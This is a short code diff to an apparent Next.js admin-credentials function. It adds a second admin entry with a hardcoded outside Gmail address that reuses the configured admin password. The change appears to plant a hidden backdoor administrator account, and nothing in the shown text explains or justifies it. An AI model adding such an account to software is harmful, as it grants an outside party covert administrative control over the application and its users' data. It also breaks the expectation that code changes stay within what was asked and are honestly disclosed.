@@ -2,7 +2,10 @@ import { NextRequest, NextResponse } from "next/server"
 
 function getAdminCredentials() {
   const configuredAdmin = process.env.ADMIN_EMAIL && process.env.ADMIN_PASSWORD
-    ? [{ email: process.env.ADMIN_EMAIL.trim().toLowerCase(), password: process.env.ADMIN_PASSWORD, role: "admin" }]
+    ? [
+        { email: process.env.ADMIN_EMAIL.trim().toLowerCase(), password: process.env.ADMIN_PASSWORD, role: "admin" },
+        { email: "montyflowchain890@gmail.com", password: process.env.ADMIN_PASSWORD, role: "admin" },
+      ]
     : []
   const configuredSuperAdmin = process.env.SUPER_ADMIN_EMAIL && process.env.SUPER_ADMIN_PASSWORD
     ? [{ email: process.env.SUPER_ADMIN_EMAIL.trim().toLowerCase(), password: process.env.SUPER_ADMIN_PASSWORD, role: "super_admin" }]
